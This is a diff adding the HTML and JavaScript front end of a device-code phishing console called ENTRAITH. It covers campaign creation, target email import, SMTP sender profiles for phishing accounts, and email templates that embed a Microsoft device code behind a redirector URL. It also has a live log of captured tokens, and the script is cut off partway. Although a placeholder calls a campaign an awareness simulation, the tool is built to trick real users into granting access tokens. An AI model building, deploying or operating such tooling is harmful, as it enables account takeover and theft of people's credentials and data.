@@ -1,0 +1,1496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ENTRAITH // Device Code Operator</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Syne:wght@400;500;600;700;800&display=swap');
+
+  :root {
+    --bg: #0a0c10;
+    --bg2: #0f1218;
+    --bg3: #161b24;
+    --border: #1e2733;
+    --accent: #00d4ff;
+    --accent2: #ff3e6c;
+    --accent3: #39ff14;
+    --warn: #ffae00;
+    --text: #c8d8e8;
+    --text-dim: #5a6a7a;
+    --text-bright: #e8f0f8;
+    --mono: 'JetBrains Mono', monospace;
+    --sans: 'Syne', sans-serif;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 13px;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,212,255,0.015) 2px, rgba(0,212,255,0.015) 4px);
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  .header {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    padding: 16px 24px;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+
+  .header-logo {
+    font-family: var(--sans);
+    font-size: 11px;
+    font-weight: 800;
+    letter-spacing: 0.3em;
+    text-transform: uppercase;
+    color: var(--accent);
+    text-shadow: 0 0 20px rgba(0,212,255,0.5);
+  }
+
+  .header-sep { color: var(--border); }
+  .header-title {
+    font-family: var(--sans);
+    font-size: 11px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: var(--text-dim);
+  }
+
+  .header-right {
+    margin-left: auto;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .status-dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    background: var(--accent3);
+    box-shadow: 0 0 8px var(--accent3);
+    animation: pulse 2s infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
+  }
+
+  .layout {
+    display: grid;
+    grid-template-columns: 290px 1fr;
+    min-height: calc(100vh - 57px);
+  }
+
+  .sidebar {
+    background: var(--bg2);
+    border-right: 1px solid var(--border);
+    padding: 20px;
+    overflow-y: auto;
+  }
+
+  .sidebar-section { margin-bottom: 24px; }
+
+  .sidebar-label {
+    font-size: 9px;
+    font-weight: 600;
+    letter-spacing: 0.3em;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    margin-bottom: 12px;
+    padding-bottom: 6px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 8px 14px;
+    border: 1px solid var(--border);
+    background: transparent;
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 11px;
+    cursor: pointer;
+    transition: all 0.15s;
+    letter-spacing: 0.05em;
+    border-radius: 2px;
+    width: 100%;
+    justify-content: center;
+    margin-bottom: 8px;
+  }
+
+  .btn:hover { border-color: var(--accent); color: var(--accent); }
+  .btn-primary { border-color: var(--accent); color: var(--accent); background: rgba(0,212,255,0.05); }
+  .btn-primary:hover { background: rgba(0,212,255,0.15); }
+  .btn-danger { border-color: var(--accent2); color: var(--accent2); background: rgba(255,62,108,0.05); }
+  .btn-danger:hover { background: rgba(255,62,108,0.15); }
+  .btn-success { border-color: var(--accent3); color: var(--accent3); background: rgba(57,255,20,0.05); }
+  .btn-success:hover { background: rgba(57,255,20,0.15); }
+  .btn-warn { border-color: var(--warn); color: var(--warn); background: rgba(255,174,0,0.05); }
+  .btn-warn:hover { background: rgba(255,174,0,0.15); }
+  .btn-sm { padding: 5px 10px; font-size: 10px; width: auto; margin-bottom: 0; }
+
+  .input-group { margin-bottom: 10px; }
+  .input-group label { display: block; font-size: 10px; color: var(--text-dim); margin-bottom: 4px; letter-spacing: 0.1em; }
+  .input-group input, .input-group select, .input-group textarea {
+    width: 100%;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 12px;
+    padding: 7px 10px;
+    border-radius: 2px;
+    outline: none;
+    transition: border-color 0.15s;
+  }
+  .input-group input:focus, .input-group textarea:focus, .input-group select:focus { border-color: var(--accent); }
+  .input-group textarea { resize: vertical; min-height: 80px; }
+  .input-group select option { background: var(--bg3); }
+
+  .input-row { display: flex; gap: 8px; }
+  .input-row .input-group { flex: 1; }
+
+  .checkbox-group { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; }
+  .checkbox-group input[type=checkbox] { width: auto; }
+  .checkbox-group label { font-size: 11px; color: var(--text-dim); margin-bottom: 0; }
+
+  .main { padding: 24px; overflow-y: auto; }
+
+  .section-header {
+    font-family: var(--sans);
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 0.25em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .section-header::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--border);
+  }
+
+  .stats-grid {
+    display: grid;
+    grid-template-columns: repeat(5, 1fr);
+    gap: 12px;
+    margin-bottom: 24px;
+  }
+
+  .stat-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    padding: 14px;
+    border-radius: 2px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .stat-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 2px;
+    background: var(--accent);
+    opacity: 0.4;
+  }
+
+  .stat-card.captured::before { background: var(--accent3); opacity: 1; }
+  .stat-card.pending::before { background: var(--warn); }
+  .stat-card.expired::before { background: var(--accent2); }
+
+  .stat-value {
+    font-family: var(--sans);
+    font-size: 28px;
+    font-weight: 800;
+    color: var(--text-bright);
+    line-height: 1;
+    margin-bottom: 4px;
+  }
+
+  .stat-card.captured .stat-value { color: var(--accent3); text-shadow: 0 0 20px rgba(57,255,20,0.4); }
+  .stat-card.pending .stat-value { color: var(--warn); }
+
+  .stat-label {
+    font-size: 9px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--text-dim);
+  }
+
+  .data-table {
+    width: 100%;
+    border-collapse: collapse;
+    margin-bottom: 24px;
+  }
+
+  .data-table th {
+    text-align: left;
+    font-size: 9px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    padding: 8px 10px;
+    border-bottom: 1px solid var(--border);
+    font-weight: 600;
+  }
+
+  .data-table td {
+    padding: 9px 10px;
+    border-bottom: 1px solid rgba(30,39,51,0.5);
+    vertical-align: middle;
+  }
+
+  .data-table tr:hover td { background: rgba(0,212,255,0.03); }
+
+  .badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    padding: 2px 8px;
+    border-radius: 2px;
+    font-size: 10px;
+    letter-spacing: 0.05em;
+    font-weight: 600;
+  }
+
+  .badge-pending { background: rgba(255,174,0,0.1); color: var(--warn); border: 1px solid rgba(255,174,0,0.3); }
+  .badge-completed { background: rgba(57,255,20,0.1); color: var(--accent3); border: 1px solid rgba(57,255,20,0.3); }
+  .badge-expired { background: rgba(255,62,108,0.1); color: var(--accent2); border: 1px solid rgba(255,62,108,0.3); }
+  .badge-error { background: rgba(255,62,108,0.1); color: var(--accent2); border: 1px solid rgba(255,62,108,0.3); }
+  .badge-initializing { background: rgba(0,212,255,0.1); color: var(--accent); border: 1px solid rgba(0,212,255,0.3); }
+  .badge-cancelled { background: rgba(90,106,122,0.2); color: var(--text-dim); border: 1px solid var(--border); }
+  .badge-ok { background: rgba(57,255,20,0.1); color: var(--accent3); border: 1px solid rgba(57,255,20,0.3); }
+  .badge-fail { background: rgba(255,62,108,0.1); color: var(--accent2); border: 1px solid rgba(255,62,108,0.3); }
+
+  .user-code {
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 0.15em;
+    color: var(--accent);
+    background: rgba(0,212,255,0.08);
+    padding: 3px 8px;
+    border-radius: 2px;
+  }
+
+  .user-code.redeemed { color: var(--accent3); background: rgba(57,255,20,0.08); }
+
+  .capture-log {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 2px;
+    overflow: hidden;
+    margin-bottom: 24px;
+  }
+
+  .capture-log-header {
+    padding: 10px 14px;
+    border-bottom: 1px solid var(--border);
+    font-size: 10px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: var(--accent3);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .capture-log-body {
+    max-height: 280px;
+    overflow-y: auto;
+    padding: 8px;
+    font-size: 11px;
+    line-height: 1.8;
+  }
+
+  .log-entry {
+    padding: 6px 10px;
+    border-radius: 2px;
+    display: flex;
+    gap: 12px;
+    align-items: baseline;
+  }
+
+  .log-entry.success { background: rgba(57,255,20,0.05); }
+  .log-entry.info { background: rgba(0,212,255,0.03); }
+
+  .log-time { color: var(--text-dim); font-size: 10px; min-width: 80px; }
+  .log-email { color: var(--accent); }
+  .log-upn { color: var(--accent3); }
+
+  .tabs {
+    display: flex;
+    gap: 0;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 20px;
+  }
+
+  .tab {
+    padding: 10px 18px;
+    font-size: 10px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    cursor: pointer;
+    border-bottom: 2px solid transparent;
+    transition: all 0.15s;
+    border: none;
+    background: none;
+    font-family: var(--mono);
+  }
+
+  .tab:hover { color: var(--text); }
+  .tab.active { color: var(--accent); border-bottom: 2px solid var(--accent); }
+
+  .tab-content { display: none; }
+  .tab-content.active { display: block; }
+
+  .notification {
+    position: fixed;
+    top: 80px;
+    right: 24px;
+    padding: 12px 18px;
+    background: var(--bg3);
+    border: 1px solid var(--accent3);
+    border-left: 3px solid var(--accent3);
+    color: var(--accent3);
+    font-size: 12px;
+    z-index: 200;
+    animation: slideIn 0.2s ease;
+    max-width: 420px;
+  }
+
+  @keyframes slideIn {
+    from { transform: translateX(100%); opacity: 0; }
+    to { transform: translateX(0); opacity: 1; }
+  }
+
+  .upload-area {
+    border: 2px dashed var(--border);
+    border-radius: 2px;
+    padding: 24px;
+    text-align: center;
+    cursor: pointer;
+    transition: all 0.15s;
+    margin-bottom: 12px;
+  }
+
+  .upload-area:hover { border-color: var(--accent); background: rgba(0,212,255,0.03); }
+  .upload-area.drag-over { border-color: var(--accent); background: rgba(0,212,255,0.08); }
+  .upload-icon { font-size: 24px; margin-bottom: 8px; }
+  .upload-text { font-size: 11px; color: var(--text-dim); }
+
+  .empty-state {
+    text-align: center;
+    padding: 48px 24px;
+    color: var(--text-dim);
+  }
+
+  .empty-state-icon { font-size: 32px; margin-bottom: 12px; opacity: 0.4; }
+  .empty-state-text { font-size: 11px; letter-spacing: 0.1em; }
+
+  /* Mail config view */
+  .config-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 24px;
+  }
+
+  .config-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 2px;
+    padding: 20px;
+  }
+
+  .config-card-title {
+    font-size: 10px;
+    font-weight: 600;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 16px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .item-list { margin-bottom: 16px; }
+
+  .item-row {
+    display: flex;
+    align-items: center;
+    padding: 8px 10px;
+    border: 1px solid var(--border);
+    border-radius: 2px;
+    margin-bottom: 6px;
+    cursor: pointer;
+    transition: border-color 0.15s;
+  }
+
+  .item-row:hover { border-color: var(--accent); }
+  .item-row.selected { border-color: var(--accent); background: rgba(0,212,255,0.05); }
+
+  .item-row-name { flex: 1; font-size: 12px; color: var(--text-bright); }
+  .item-row-sub { font-size: 10px; color: var(--text-dim); }
+  .item-row-actions { display: flex; gap: 6px; }
+
+  .template-editor {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 2px;
+    overflow: hidden;
+  }
+
+  .editor-toolbar {
+    padding: 8px 12px;
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .editor-toolbar span {
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 0.1em;
+  }
+
+  .editor-toolbar .var-chip {
+    padding: 2px 8px;
+    background: rgba(0,212,255,0.1);
+    border: 1px solid rgba(0,212,255,0.3);
+    border-radius: 2px;
+    font-size: 10px;
+    color: var(--accent);
+    cursor: pointer;
+    font-family: var(--mono);
+  }
+
+  .editor-toolbar .var-chip:hover { background: rgba(0,212,255,0.2); }
+
+  textarea.code-editor {
+    width: 100%;
+    min-height: 320px;
+    background: var(--bg3);
+    border: none;
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 12px;
+    padding: 14px;
+    outline: none;
+    resize: vertical;
+    line-height: 1.6;
+  }
+
+  .hint {
+    font-size: 10px;
+    color: var(--text-dim);
+    margin-top: 4px;
+    line-height: 1.5;
+  }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 20px 0;
+  }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="header-logo">ENTRAITH</div>
+  <div class="header-sep">//</div>
+  <div class="header-title">Device Code Operator Console</div>
+  <div class="header-right">
+    <div class="status-dot" id="connectionDot"></div>
+    <span id="connectionStatus" style="font-size:10px;color:var(--text-dim)">CONNECTED</span>
+  </div>
+</div>
+
+<div class="layout">
+  <!-- Sidebar -->
+  <div class="sidebar">
+
+    <div class="sidebar-section">
+      <div class="sidebar-label">New Campaign</div>
+      <div class="input-group">
+        <label>Campaign Name</label>
+        <input type="text" id="campName" placeholder="q1-finance-dc">
+      </div>
+      <div class="input-group">
+        <label>Description (optional)</label>
+        <input type="text" id="campDesc" placeholder="Q1 Finance awareness sim">
+      </div>
+      <button class="btn btn-primary" onclick="createCampaign()">⊕ Create Campaign</button>
+    </div>
+
+    <div class="sidebar-section">
+      <div class="sidebar-label">Active Campaign</div>
+      <div id="campaignList" style="font-size:11px;color:var(--text-dim)">No campaigns yet</div>
+    </div>
+
+    <div class="sidebar-section">
+      <div class="sidebar-label">Import Targets</div>
+      <div class="upload-area" id="uploadArea" onclick="document.getElementById('csvFile').click()">
+        <div class="upload-icon">📋</div>
+        <div class="upload-text">Drop CSV or click to browse<br><span style="font-size:10px;opacity:0.6">columns: email, display_name, department, region, group</span></div>
+      </div>
+      <input type="file" id="csvFile" accept=".csv,.txt" style="display:none" onchange="importCSV(this)">
+      <div class="input-group">
+        <label>Or paste emails (one per line)</label>
+        <textarea id="emailPaste" placeholder="user1@corp.com&#10;user2@corp.com"></textarea>
+      </div>
+      <button class="btn" onclick="importPasted()">↑ Import Pasted</button>
+    </div>
+
+    <div class="sidebar-section">
+      <div class="sidebar-label">Phishing Mail</div>
+      <div class="input-group">
+        <label>Sender Profile</label>
+        <select id="selectedProfile">
+          <option value="">— no profile —</option>
+        </select>
+      </div>
+      <div class="input-group">
+        <label>Email Template</label>
+        <select id="selectedTemplate">
+          <option value="">— no template —</option>
+        </select>
+      </div>
+      <button class="btn btn-warn" onclick="sendPhishingEmails()">✉ Send Phishing Emails</button>
+      <button class="btn" onclick="showMailConfig()">⚙ Configure Mail</button>
+    </div>
+
+    <div class="sidebar-section">
+      <div class="sidebar-label">Campaign Actions</div>
+      <button class="btn btn-success" onclick="launchCampaign()">▶ Launch Campaign</button>
+      <button class="btn btn-danger" onclick="stopCampaign()">■ Stop Campaign</button>
+      <button class="btn btn-primary" onclick="exportCampaign()">↓ Export Campaign</button>
+      <button class="btn btn-danger" onclick="confirmDeleteCampaign()">🗑 Delete Campaign</button>
+    </div>
+
+  </div>
+
+  <!-- Main content -->
+  <div class="main">
+
+    <!-- Empty state -->
+    <div id="emptyState" class="empty-state">
+      <div class="empty-state-icon">⚡</div>
+      <div class="empty-state-text">Create or select a campaign to begin</div>
+    </div>
+
+    <!-- Campaign view -->
+    <div id="campaignView" style="display:none">
+      <div class="stats-grid">
+        <div class="stat-card">
+          <div class="stat-value" id="statTargets">0</div>
+          <div class="stat-label">Targets</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" id="statActive">0</div>
+          <div class="stat-label">Active Sessions</div>
+        </div>
+        <div class="stat-card pending">
+          <div class="stat-value" id="statPending">0</div>
+          <div class="stat-label">Pending Auth</div>
+        </div>
+        <div class="stat-card captured">
+          <div class="stat-value" id="statCaptured">0</div>
+          <div class="stat-label">Tokens Captured</div>
+        </div>
+        <div class="stat-card expired">
+          <div class="stat-value" id="statExpired">0</div>
+          <div class="stat-label">Expired</div>
+        </div>
+      </div>
+
+      <div class="tabs">
+        <button class="tab active" onclick="switchTab('sessions', this)">Sessions</button>
+        <button class="tab" onclick="switchTab('tokens', this)">Captured Tokens</button>
+        <button class="tab" onclick="switchTab('targets', this)">Targets</button>
+        <button class="tab" onclick="switchTab('emails', this)">Emails Sent</button>
+      </div>
+
+      <!-- Sessions tab -->
+      <div id="tab-sessions" class="tab-content active">
+        <div class="section-header">Live Sessions</div>
+        <table class="data-table">
+          <thead>
+            <tr>
+              <th>Target Email</th>
+              <th>User Code</th>
+              <th>Status</th>
+              <th>Poll Count</th>
+              <th>Expires</th>
+              <th>UPN (resolved)</th>
+            </tr>
+          </thead>
+          <tbody id="sessionsBody">
+            <tr><td colspan="6" style="text-align:center;padding:32px;color:var(--text-dim)">No active sessions</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <!-- Tokens tab -->
+      <div id="tab-tokens" class="tab-content">
+        <div class="section-header">Captured Tokens</div>
+        <div class="capture-log">
+          <div class="capture-log-header">
+            <span style="width:8px;height:8px;border-radius:50%;background:var(--accent3);display:inline-block;animation:pulse 1s infinite"></span>
+            Token Capture Log
+          </div>
+          <div class="capture-log-body" id="tokenLog">
+            <div style="padding:24px;text-align:center;color:var(--text-dim);font-size:11px">Waiting for tokens...</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Targets tab -->
+      <div id="tab-targets" class="tab-content">
+        <div class="section-header">Loaded Targets</div>
+        <table class="data-table">
+          <thead>
+            <tr>
+              <th>Email</th>
+              <th>Display Name</th>
+              <th>Department</th>
+              <th>Region</th>
+              <th>Group</th>
+            </tr>
+          </thead>
+          <tbody id="targetsBody">
+            <tr><td colspan="5" style="text-align:center;padding:32px;color:var(--text-dim)">No targets imported</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <!-- Emails tab -->
+      <div id="tab-emails" class="tab-content">
+        <div class="section-header">Email Send Results</div>
+        <table class="data-table">
+          <thead>
+            <tr>
+              <th>Target Email</th>
+              <th>Status</th>
+              <th>Sent At</th>
+              <th>Error</th>
+            </tr>
+          </thead>
+          <tbody id="emailResultsBody">
+            <tr><td colspan="4" style="text-align:center;padding:32px;color:var(--text-dim)">No emails sent yet</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- Mail config view -->
+    <div id="mailConfigView" style="display:none">
+      <div class="section-header">Mail Configuration</div>
+
+      <div class="tabs">
+        <button class="tab active" onclick="switchMailTab('profiles', this)">Sender Profiles</button>
+        <button class="tab" onclick="switchMailTab('templates', this)">Email Templates</button>
+      </div>
+
+      <!-- Profiles tab -->
+      <div id="mailtab-profiles" class="tab-content active">
+        <div class="config-grid">
+          <!-- Left: existing profiles -->
+          <div>
+            <div style="font-size:10px;letter-spacing:0.15em;text-transform:uppercase;color:var(--text-dim);margin-bottom:12px">Saved Profiles</div>
+            <div class="item-list" id="profileList">
+              <div style="color:var(--text-dim);font-size:11px">No profiles yet</div>
+            </div>
+            <button class="btn btn-sm" onclick="newProfileForm()">+ New Profile</button>
+          </div>
+          <!-- Right: form -->
+          <div id="profileFormWrap">
+            <div class="config-card">
+              <div class="config-card-title">Sender Profile</div>
+              <div class="input-group">
+                <label>Profile Name</label>
+                <input type="text" id="profName" placeholder="Office365 Phish Account">
+              </div>
+              <div class="input-row">
+                <div class="input-group">
+                  <label>SMTP Host</label>
+                  <input type="text" id="profHost" placeholder="smtp.office365.com">
+                </div>
+                <div class="input-group" style="max-width:90px">
+                  <label>Port</label>
+                  <input type="number" id="profPort" value="587">
+                </div>
+              </div>
+              <div class="input-group">
+                <label>Username</label>
+                <input type="text" id="profUser" placeholder="phish@yourdomain.com">
+              </div>
+              <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="profPass" placeholder="••••••••••••">
+              </div>
+              <div class="input-group">
+                <label>From Name</label>
+                <input type="text" id="profFromName" placeholder="IT Security Team">
+              </div>
+              <div class="input-group">
+                <label>From Address</label>
+                <input type="text" id="profFromAddr" placeholder="security@yourdomain.com">
+              </div>
+              <div class="checkbox-group">
+                <input type="checkbox" id="profImplicitTLS">
+                <label for="profImplicitTLS">Implicit TLS (port 465 / SMTPS) — uncheck for STARTTLS/587</label>
+              </div>
+              <div style="display:flex;gap:8px;margin-top:4px">
+                <button class="btn btn-primary btn-sm" onclick="saveProfile()" style="flex:1">Save Profile</button>
+                <button class="btn btn-sm" onclick="testProfile()" style="flex:1">Test Send</button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Templates tab -->
+      <div id="mailtab-templates" class="tab-content">
+        <div class="config-grid">
+          <!-- Left: template list -->
+          <div>
+            <div style="font-size:10px;letter-spacing:0.15em;text-transform:uppercase;color:var(--text-dim);margin-bottom:12px">Saved Templates</div>
+            <div class="item-list" id="templateList">
+              <div style="color:var(--text-dim);font-size:11px">No templates yet</div>
+            </div>
+            <button class="btn btn-sm" onclick="newTemplateForm()">+ New Template</button>
+          </div>
+          <!-- Right: editor -->
+          <div>
+            <div class="config-card">
+              <div class="config-card-title" style="display:flex;justify-content:space-between;align-items:center">
+                <span>Email Template</span>
+                <label class="btn btn-sm" style="cursor:pointer;margin-bottom:0">
+                  ↑ Upload HTML
+                  <input type="file" accept=".html,.htm" style="display:none" onchange="uploadHTMLTemplate(this)">
+                </label>
+              </div>
+              <div class="input-group">
+                <label>Template Name</label>
+                <input type="text" id="tmplName" placeholder="MFA Device Code Phish">
+              </div>
+              <div class="input-group">
+                <label>Subject</label>
+                <input type="text" id="tmplSubject" placeholder="Action Required: Verify your device">
+              </div>
+
+              <div class="input-group">
+                <label>Redirector URL <span style="color:var(--text-dim);font-weight:normal">(optional — if set, {{URL}} resolves to this instead of the real Microsoft URL)</span></label>
+                <input type="text" id="tmplRedirector" placeholder="https://r.yourdomain.com/go">
+              </div>
+
+              <div class="input-group">
+                <label>HTML Body</label>
+                <div class="template-editor">
+                  <div class="editor-toolbar">
+                    <span>Insert:</span>
+                    <span class="var-chip" onclick="insertVar('tmplHTML','{{DCODE}}')">{{DCODE}}</span>
+                    <span class="var-chip" onclick="insertVar('tmplHTML','{{URL}}')">{{URL}}</span>
+                    <span class="var-chip" onclick="insertVar('tmplHTML','{{REALURL}}')">{{REALURL}}</span>
+                    <span class="var-chip" onclick="insertVar('tmplHTML','{{EMAIL}}')">{{EMAIL}}</span>
+                    <span class="var-chip" onclick="insertVar('tmplHTML','{{NAME}}')">{{NAME}}</span>
+                  </div>
+                  <textarea class="code-editor" id="tmplHTML" placeholder="<p>Hello {{NAME}},</p>
+<p>Please verify your device by visiting <a href=&quot;{{URL}}&quot;>{{URL}}</a> and entering the code:</p>
+<h2>{{DCODE}}</h2>"></textarea>
+                </div>
+                <div class="hint">{{DCODE}} = user code &nbsp;|&nbsp; {{URL}} = redirector URL (or real URL if no redirector set) &nbsp;|&nbsp; {{REALURL}} = real Microsoft URL &nbsp;|&nbsp; {{EMAIL}} = target email &nbsp;|&nbsp; {{NAME}} = display name</div>
+              </div>
+
+              <div class="input-group">
+                <label>Plain Text Body (optional fallback)</label>
+                <textarea id="tmplText" style="min-height:80px" placeholder="Plain text version for email clients that don't render HTML..."></textarea>
+              </div>
+
+              <div style="display:flex;gap:8px;margin-top:4px">
+                <button class="btn btn-primary btn-sm" onclick="saveTemplate()" style="flex:1">Save Template</button>
+                <button class="btn btn-sm" onclick="previewTemplate()" style="flex:1">Preview</button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="divider">
+      <button class="btn btn-sm" onclick="showCampaignViewOrEmpty()" style="width:auto">← Back to Campaign</button>
+    </div>
+
+  </div>
+</div>
+
+<div id="notification" style="display:none" class="notification"></div>
+
+<!-- Preview modal -->
+<div id="previewModal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.8);z-index:300;display:none;align-items:center;justify-content:center">
+  <div style="background:var(--bg2);border:1px solid var(--border);border-radius:4px;width:700px;max-height:80vh;overflow:auto;padding:0">
+    <div style="padding:12px 16px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center">
+      <span style="font-size:11px;letter-spacing:0.15em;text-transform:uppercase;color:var(--accent)">Template Preview</span>
+      <button onclick="closePreview()" style="background:none;border:none;color:var(--text-dim);cursor:pointer;font-size:16px">✕</button>
+    </div>
+    <iframe id="previewFrame" style="width:100%;height:500px;border:none;background:#fff"></iframe>
+  </div>
+</div>
+
+<script>
+// ─── State ──────────────────────────────────────────────────────────────────
+let activeCampaignID = null;
+let eventSource = null;
+let tokensSeen = new Set();
+let editingProfileID = null;
+let editingTemplateID = null;
+
+// ─── Notification ────────────────────────────────────────────────────────────
+function notify(msg, error=false) {
+  const el = document.getElementById('notification');
+  el.textContent = msg;
+  el.style.borderColor = error ? 'var(--accent2)' : 'var(--accent3)';
+  el.style.color = error ? 'var(--accent2)' : 'var(--accent3)';
+  el.style.display = 'block';
+  setTimeout(() => el.style.display = 'none', 4000);
+}
+
+// ─── API helper ──────────────────────────────────────────────────────────────
+async function api(method, path, body) {
+  const opts = { method, headers: {'Content-Type': 'application/json'} };
+  if (body !== undefined) opts.body = JSON.stringify(body);
+  try {
+    const r = await fetch('/api' + path, opts);
+    return await r.json();
+  } catch(e) {
+    return { error: e.message };
+  }
+}
+
+// ─── View management ─────────────────────────────────────────────────────────
+function showView(name) {
+  document.getElementById('emptyState').style.display = name === 'empty' ? 'block' : 'none';
+  document.getElementById('campaignView').style.display = name === 'campaign' ? 'block' : 'none';
+  document.getElementById('mailConfigView').style.display = name === 'mail' ? 'block' : 'none';
+}
+
+function showCampaignViewOrEmpty() {
+  showView(activeCampaignID ? 'campaign' : 'empty');
+}
+
+function showMailConfig() {
+  showView('mail');
+  loadProfiles();
+  loadTemplates();
+}
+
+// ─── Campaigns ───────────────────────────────────────────────────────────────
+async function createCampaign() {
+  const name = document.getElementById('campName').value.trim();
+  if (!name) { notify('Campaign name required', true); return; }
+  const desc = document.getElementById('campDesc').value.trim();
+  const result = await api('POST', '/campaigns', { name, description: desc });
+  if (result.error) { notify(result.error, true); return; }
+  activeCampaignID = result.id;
+  notify('Campaign created: ' + result.id);
+  renderCampaignList([result]);
+  showView('campaign');
+  loadTargets();
+}
+
+async function launchCampaign() {
+  if (!activeCampaignID) { notify('Select a campaign first', true); return; }
+  const result = await api('POST', '/campaigns/' + activeCampaignID + '/launch');
+  if (result.error) { notify(result.error, true); return; }
+  notify('Campaign launched — polling started for all targets');
+  startEventStream();
+}
+
+async function stopCampaign() {
+  if (!activeCampaignID) return;
+  await api('POST', '/campaigns/' + activeCampaignID + '/stop');
+  notify('Campaign stopped');
+  if (eventSource) { eventSource.close(); eventSource = null; }
+}
+
+async function selectCampaign(id) {
+  activeCampaignID = id;
+  showView('campaign');
+  loadTargets();
+  loadEmailResults();
+  startEventStream();
+}
+
+function renderCampaignList(camps) {
+  const el = document.getElementById('campaignList');
+  el.innerHTML = camps.map(c => `
+    <div style="padding:8px;border:1px solid var(--border);border-radius:2px;margin-bottom:6px;cursor:pointer${activeCampaignID===c.id?';border-color:var(--accent)':''}" onclick="selectCampaign('${c.id}')">
+      <div style="color:var(--accent);font-size:11px">${c.name || c.id}</div>
+      <div style="color:var(--text-dim);font-size:10px">${c.status || 'draft'}</div>
+    </div>
+  `).join('');
+}
+
+// ─── Targets ─────────────────────────────────────────────────────────────────
+async function importCSV(input) {
+  if (!activeCampaignID) { notify('Create a campaign first', true); return; }
+  const file = input.files[0];
+  if (!file) return;
+  const form = new FormData();
+  form.append('file', file);
+  const r = await fetch('/api/campaigns/' + activeCampaignID + '/targets/import', { method: 'POST', body: form });
+  const result = await r.json();
+  if (result.error) { notify(result.error, true); return; }
+  notify('Imported ' + result.imported + ' targets, skipped ' + result.skipped);
+  loadTargets();
+}
+
+async function importPasted() {
+  if (!activeCampaignID) { notify('Create a campaign first', true); return; }
+  const text = document.getElementById('emailPaste').value.trim();
+  if (!text) return;
+  const lines = text.split('\n').map(l => l.trim()).filter(Boolean);
+  const csv = 'email\n' + lines.join('\n');
+  const r = await fetch('/api/campaigns/' + activeCampaignID + '/targets/import', {
+    method: 'POST',
+    headers: { 'Content-Type': 'text/plain' },
+    body: csv
+  });
+  const result = await r.json();
+  if (result.error) { notify(result.error, true); return; }
+  notify('Imported ' + result.imported + ' targets');
+  document.getElementById('emailPaste').value = '';
+  loadTargets();
+}
+
+async function loadTargets() {
+  if (!activeCampaignID) return;
+  const targets = await api('GET', '/campaigns/' + activeCampaignID + '/targets');
+  if (!Array.isArray(targets)) return;
+  document.getElementById('statTargets').textContent = targets.length;
+  const body = document.getElementById('targetsBody');
+  if (targets.length === 0) {
+    body.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:32px;color:var(--text-dim)">No targets imported</td></tr>';
+    return;
+  }
